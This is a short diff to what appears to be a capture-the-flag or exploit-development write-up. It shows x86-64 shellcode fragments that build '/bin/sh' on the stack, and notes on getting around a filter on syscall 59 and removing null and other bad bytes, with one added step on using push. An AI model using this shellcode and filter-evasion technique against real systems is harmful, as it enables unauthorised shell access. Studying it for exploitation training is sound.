@@ -88,7 +88,7 @@ b'/bin/sh\x00'
 
 > UPDATED SHELLCODE
 
-```
+```asm
 mov rax, 0x68732f6e69622f
 push rax
 mov rdi, rsp
@@ -102,7 +102,7 @@ syscall
 
 #### NOTES:
 
-```
+```asm
 To obtain the correct asm instructions is using trial and error. If you pass:
 
 mov rax, 0x3a
@@ -118,3 +118,4 @@ It shall bypassed the 59 filter, but introduced another bad bytes.
 
 
 9. Great! Now let's try to bypass the NULL byte first.
+10. Using the same method as previous to get rid of another bad byte introduced. I used `push` instruction to push the value first onto the stack pointer.
